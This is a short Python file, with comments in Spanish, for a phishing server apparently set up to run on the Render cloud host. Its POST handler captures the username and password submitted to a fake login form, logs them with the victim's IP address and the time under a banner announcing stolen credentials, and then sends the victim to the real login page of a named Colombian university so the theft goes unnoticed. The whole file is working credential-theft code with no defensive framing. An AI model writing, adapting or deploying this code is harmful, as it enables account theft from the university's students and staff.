import http.server
import urllib.parse
import datetime
import os

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def end_headers(self):
        super().end_headers()

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
        params = urllib.parse.parse_qs(post_data)
        
        usuario = params.get('usuario', [''])[0]
        clave = params.get('clave', [''])[0]
        
        ip = self.headers.get('X-Forwarded-For', self.client_address[0])
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # IMPRESIÓN DIRECTA EN LOS LOGS DE RENDER (100% Seguro y visible al instante)
        print("\n" + "="*60)
        print(f"🚨 ¡CREDENCIALES CAPTURADAS EXITOSAMENTE! 🚨")
        print(f"📅 Fecha y Hora: {fecha}")
        print(f"🌐 IP de la Víctima: {ip}")
        print(f"👤 Usuario / Documento: {usuario}")
        print(f"🔑 Contraseña: {clave}")
        print("="*60 + "\n")
        
        # Redirigir de inmediato a la víctima al sitio real de la universidad
        self.send_response(302)
        self.send_header('Location', 'https://sigedin.uniputumayo.edu.co/login')
        self.end_headers()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    server_address = ('0.0.0.0', port)
    httpd = http.server.HTTPServer(server_address, PhishingHandler)
    print(f"==================================================")
    print(f" SERVIDOR EN LA NUBE (RENDER) ACTIVO EN PUERTO {port}")
    print(f"==================================================")
    httpd.serve_forever()